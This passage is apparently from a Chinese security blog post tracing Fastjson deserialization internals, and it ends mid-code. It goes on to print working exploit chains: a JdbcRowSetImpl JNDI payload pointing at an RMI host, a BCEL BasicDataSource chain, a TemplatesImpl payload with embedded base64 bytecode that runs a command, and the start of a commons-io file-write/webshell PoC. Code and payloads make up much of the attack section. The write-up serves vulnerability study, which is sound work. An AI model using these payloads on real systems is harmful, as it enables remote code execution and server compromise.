Object，可以使用<code>parse()</code>方法。该方法默认将JSON字符串反序列化为一个JSONObject对象</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733466153949-5ccdff26-322d-406b-a4a2-0015e21f0b90.png" alt=""></p><p>那么我们怎么将JSON字符串反序列化为原始的类呢？这里有两种方法</p><p>第一种是序列化的时候，在<code>toJSONString()</code>方法中添加额外的属性<code>SerializerFeature._WriteClassName_</code>，将对象类型一并序列化，如下所示</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">jsonString1</span> <span class="operator">=</span> JSON.toJSONString(ocean, SerializerFeature.WriteClassName);</span><br><span class="line">System.out.println(jsonString1);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">输出</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.ocean.User&quot;</span>,<span class="string">&quot;age&quot;</span>:<span class="number">22</span>,<span class="string">&quot;id&quot;</span>:<span class="number">123456</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;ocean&quot;</span>&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在反序列化时parse就会根据@type标识将其转换为原来的类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">parse1</span> <span class="operator">=</span> JSON.parse(jsonString1);</span><br><span class="line">System.out.println(parse1);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733466349987-aeb5392d-ca6a-42d9-aa7b-d72ef65e554b.png" alt=""></p><p>可以看到在进行反序列化时会调用这个类的无参构造和set方法</p><p>再来看看parseObject方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">JSONObject</span> <span class="variable">jsonObject1</span> <span class="operator">=</span> JSON.parseObject(jsonString1);</span><br><span class="line">System.out.println(jsonObject1);</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733466454167-11d687cb-74f7-40b5-9903-502959a397d5.png" alt=""></p><p>可以看到不仅会调用无参构造还会调用set和get方法，这就是他们的区别。总结一下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">json字符串还原位对象的两种方法：</span><br><span class="line"><span class="comment">//parse反序列化</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">parse1</span> <span class="operator">=</span> JSON.parse(jsonString1);</span><br><span class="line">        System.out.println(parse1);</span><br><span class="line">        <span class="comment">//parseObject反序列化</span></span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject1</span> <span class="operator">=</span> JSON.parseObject(jsonString1);</span><br><span class="line">        System.out.println(jsonObject1);</span><br><span class="line"></span><br><span class="line">区别在于parse方法在调用时会调用set方法</span><br><span class="line">parseObject在调用时会调用set get方法</span><br><span class="line">跟进看看</span><br></pre></td></tr></table></figure><h2 id="漏洞原理">漏洞原理</h2><p>这里记录一下漏洞原理源码调试分析一下</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733466977271-a0140f96-a6df-4436-8142-bf06f8a1b1f8.png" alt=""></p><p>在进行parse的时候会重载，然后在进判断是否为空不为空就继续执行，跟到DefaultJSONParser里面看看</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733467123617-e7b8a4d0-5b62-491c-b01a-9b2161ed46e7.png" alt=""></p><p>继续跟</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733467140333-52313f53-9640-43d2-a4c1-6af65e50f393.png" alt=""></p><p>判断第一个字符是不是<code>&#123;</code>如果是，就把token设置为12 ，不是就是14</p><p>走完这里回溯到</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733467458752-96a052ca-db70-49ef-91f5-4a39eab29802.png" alt=""></p><p>跟到这个parse方法里</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733467524674-9ffaa2de-d017-4200-8761-31c5a8c05c87.png" alt=""></p><p>跟进parseObject里</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733467904378-19915852-6ce1-4b87-8036-df86c37ebdc2.png" alt=""></p><p>这里这个方法会获取返回@type的这个字符串</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733467989039-b604f9da-81d8-4b29-8d97-1613a8d4fd4b.png" alt=""></p><p>走到下面会发现又调用了scanSymbol方法会返回@type的值也就是要反序列化的类，然后会调用loadclass去加载@type指定的类。</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733468849841-e7621543-dc9a-42fc-859b-db2112b95845.png" alt=""></p><p>往下走跟到这里跟进去</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733468861014-e4b36640-3a07-4b75-8d38-9b19331e8791.png" alt=""></p><p>继续跟进去</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733469088361-5fc1a5de-a4a2-4401-8247-4ff8c0a16792.png" alt=""></p><p>跟进去</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733469154393-aeac64b2-ac0f-4ab2-bdf0-a9b9048f0777.png" alt=""></p><p>到这里会去build里面通过反射查找get set方法。所以这里引用别人的总结</p><p>也就是说当我们指定<code>@type</code>为恶意类时，并且其getter/setter有着一定危害时，就会出现无法预估的危害，重点就在于其会自动执行getter/setter，简单的来解释下原理就是通过反射调用get方法获取值，相应的就是通过反射调用set方法存储值，其中getter自动调用还需要满足以下条件：</p><ul><li>方法名长度大于4</li><li>非静态方法</li><li>以get开头且第四个字母为大写</li><li>无参数传入</li><li>返回值类型继承自Collection Map AtomicBoolean AtomicInteger AtomicLong</li></ul><p>setter自动调用需要满足以下条件：</p><ul><li>方法名长度大于4</li><li>非静态方法</li><li>返回值为void或者当前类</li><li>以set开头且第四个字母为大写</li><li>参数个数为1个</li></ul><p>除此之外Fastjson还有以下功能点：</p><ol><li>如果目标类中私有变量没有setter方法，但是在反序列化时仍想给这个变量赋值，则需要使用<code>Feature.SupportNonPublicField</code>参数</li><li>fastjson 在为类属性寻找getter/setter方法时，调用函数<code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch()</code>方法，会忽略<code>_ -</code>字符串</li><li>fastjson 在反序列化时，如果Field类型为byte[]，将会调用<code>com.alibaba.fastjson.parser.JSONScanner#bytesValue</code>进行base64解码，在序列化时也会进行base64编码</li></ol><h2 id="fastjson1-2-24">fastjson1.2.24</h2><h3 id="JdbcRowSetImpl利用链">JdbcRowSetImpl利用链</h3><p>这里直接看起漏洞点</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733472238279-f48c9dd3-c1c1-4903-b82a-ed6720de020b.png" alt=""></p><p>是这个set方法前面说setter方法自动调用的利用条件这里都满足了，这里conn如果是空的话就会调用connect方法跟到connect方法里看看</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733472324158-fa32ee6b-a492-4b3a-8708-04264806c600.png" alt="">看到有一个很明显的jndi注入。并且datasourcename可控</p><p>所以可以直接写payload了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://10.169.5.52:1099/kyesra&quot;</span>,<span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure><p>这条链有版本、依赖、出网限制</p><h2 id="Fastjson不出网">Fastjson不出网</h2><h3 id="BCEl链">BCEl链</h3><p>bcel具体原理和用法参考<a href="https://www.yuque.com/zqiangweihuakai/ybltae/qlir1pya36gtghqn">java 动态加载字节码</a>，里面有介绍这里我们来学习一下如何结合fastjson进行利用。</p><p>这条链的利用需要结合tomcat-dbcp依赖来看一下具体的关键点，主要是利用了BasicDataSource这个类</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733476586441-ecc99782-d92e-43bf-afe4-a0d532ee0daf.png" alt=""></p><p>这个类里面有一个createConnectionFactory方法，里面调用了Class.forName,这个我们知道底层也是调用的loadclass方法去加载类。</p><p>这里可以看这个方法里的逻辑，如果driverClassLoader不是空的话就会调用这个forName，加载driverClassName，那么我们如果能将这个属性改为bcel的恶意的classname那么就可以触发漏洞，所以需要找到一个set方法可以找到其实是有的</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733476926393-a5b2a108-67cd-4c9d-9dce-73943f492615.png" alt=""><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733476953544-1a325ad1-e3e5-497c-bb3a-61c2c7d3084c.png" alt=""></p><p>那么现在就是要找到一个get set方法在反序列化过程中能够触发createConnectionFactory方法这里也是有的</p><p>可以找到<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733477249817-f1188ed2-2437-4168-9278-3df5a28d49fb.png" alt=""></p><p>这个类里有getconnection方法，最后会调用createDataSource方法跟进去看看</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733477309602-528a4833-3c88-4ac4-b318-eb79328c720b.png" alt=""></p><p>这里又调用了createConnectionFactory所以这条利用链就完整了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.dbcp.dbcp2.BasicDataSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BcelLoad</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, InstantiationException, IllegalAccessException, SQLException &#123;</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">javaClass</span> <span class="operator">=</span> Repository.lookupClass(Evil.class);</span><br><span class="line">        <span class="type">String</span> <span class="variable">encode</span> <span class="operator">=</span><span class="string">&quot;$$BCEL$$&quot;</span> + Utility.encode(javaClass.getBytes(), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">BasicDataSource</span> <span class="variable">basicDataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BasicDataSource</span>();</span><br><span class="line">        basicDataSource.setDriverClassLoader(<span class="keyword">new</span> <span class="title class_">ClassLoader</span>());</span><br><span class="line">        basicDataSource.setDriverClassName(encode);</span><br><span class="line">        basicDataSource.getConnection();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在写成json的形式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.dbcp.dbcp2.BasicDataSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BcelLoad</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, InstantiationException, IllegalAccessException, SQLException &#123;</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">javaClass</span> <span class="operator">=</span> Repository.lookupClass(Evil.class);</span><br><span class="line">        <span class="type">String</span> <span class="variable">encode</span> <span class="operator">=</span>  Utility.encode(javaClass.getBytes(), <span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&quot;,\&quot;driverClassName\&quot;:&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;\&quot;$$BCEL$$&quot;</span> + encode + <span class="string">&quot;\&quot;,\&quot;driverClassloader\&quot;:&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;&#125;&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(s);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="TemplatesImpl链">TemplatesImpl链</h3><p>这里先去看看TemplatesImpl加载字节码的用法<a href="https://www.yuque.com/zqiangweihuakai/ybltae/qlir1pya36gtghqn">java 动态加载字节码</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilClass</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvilClass</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">EvilClass</span> <span class="variable">evilClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EvilClass</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64.Encoder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> &#123;</span><br><span class="line">        <span class="type">byte</span>[] buffer = <span class="literal">null</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">filepath</span> <span class="operator">=</span> <span class="string">&quot;/Users/ocean/Cybersecurity/Java_project/FastjsonStu/target/test-classes/org/example/EvilClass.class&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filepath);</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">byte</span>[] b = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="type">int</span> n;</span><br><span class="line">            <span class="keyword">while</span>((n = fis.read(b))!=-<span class="number">1</span>) &#123;</span><br><span class="line">                bos.write(b,<span class="number">0</span>,n);</span><br><span class="line">            &#125;</span><br><span class="line">            fis.close();</span><br><span class="line">            bos.close();</span><br><span class="line">            buffer = bos.toByteArray();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> encoder.encodeToString(buffer);</span><br><span class="line">        System.out.println(value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是生成的恶意字节码的流程</p><p>这里我先贴出网上的payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\&quot;_bytecodes\&quot;:[\&quot;yv66vgAAADQANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABdMb3JnL2V4YW1wbGUvRXZpbENsYXNzOwEACkV4Y2VwdGlvbnMHACwBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7BwAtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABGFyZ3MBABNbTGphdmEvbGFuZy9TdHJpbmc7AQAJZXZpbENsYXNzBwAuAQAKU291cmNlRmlsZQEADkV2aWxDbGFzcy5qYXZhDAAIAAkHAC8MADAAMQEAEm9wZW4gLWEgQ2FsY3VsYXRvcgwAMgAzAQAVb3JnL2V4YW1wbGUvRXZpbENsYXNzAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABwAAAAAABAABAAgACQACAAoAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACwAAAA4AAwAAAAwABAANAA0ADgAMAAAADAABAAAADgANAA4AAAAPAAAABAABABAAAQARABIAAgAKAAAAPwAAAAMAAAABsQAAAAIACwAAAAYAAQAAABMADAAAACAAAwAAAAEADQAOAAAAAAABABMAFAABAAAAAQAVABYAAgAPAAAABAABABcAAQARABgAAgAKAAAASQAAAAQAAAABsQAAAAIACwAAAAYAAQAAABYADAAAACoABAAAAAEADQAOAAAAAAABABMAFAABAAAAAQAZABoAAgAAAAEAGwAcAAMADwAAAAQAAQAXAAkAHQAeAAIACgAAAEEAAgACAAAACbsABVm3AAZMsQAAAAIACwAAAAoAAgAAABkACAAaAAwAAAAWAAIAAAAJAB8AIAAAAAgAAQAhAA4AAQAPAAAABAABACIAAQAjAAAAAgAk\n\&quot;],&#x27;_name&#x27;:&#x27;exp&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;&#125;&quot;</span>;</span><br><span class="line">JSON.parseObject(payload, Feature.SupportNonPublicField);</span><br></pre></td></tr></table></figure><p>这里来调试一遍执行流程</p><p>在前面的分析过程中我们知道了在使用parseObject进行json反序列化的时候会自动调用 对应类的get 和 set方法</p><p>所以这里可以找到TemplatesImpl类里的触发点事getOutputProperties方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733560419701-03376ca9-afdb-44c5-bcee-58ddde960955.png" alt=""></p><p>可以看到这里调用了newTransformer方法所以后面的执行流程就很明确了直接参考TemplatesImpl动态加载字节码就可以了。这条链子属于比较难利用的点因为其赋值的属性都是private所以需要开启配置选项。</p><h3 id="Commons-io-写文件-webshell">Commons-io 写文件/webshell</h3><p>我这里把poc复制过来</p><h4 id="Jre8-原始poc">Jre8 原始poc</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;x&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;sun.rmi.server.MarshalOutputStream&quot;</span>,</span><br><span class="line">        <span class="string">&quot;out&quot;</span>:&#123;</span><br><span class="line">            <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.util.zip.InflaterOutputStream&quot;</span>,</span><br><span class="line">            <span class="string">&quot;out&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.io.FileOutputStream&quot;</span>,</span><br><span class="line">                <span class="string">&quot;file&quot;</span>:<span class="string">&quot;/tmp/dest.txt&quot;</span>,</span><br><span class="line">                <span class="string">&quot;append&quot;</span>:<span class="literal">false</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;infl&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;input&quot;</span>:<span class="string">&quot;eJwL8nUyNDJSyCxWyEgtSgUAHKUENw==&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;bufLen&quot;</span>:<span class="number">1048576</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;protocolVersion&quot;</span>:<span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="commons-io-2-0-2-6-版本：">commons-io 2.0 - 2.6 版本：</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 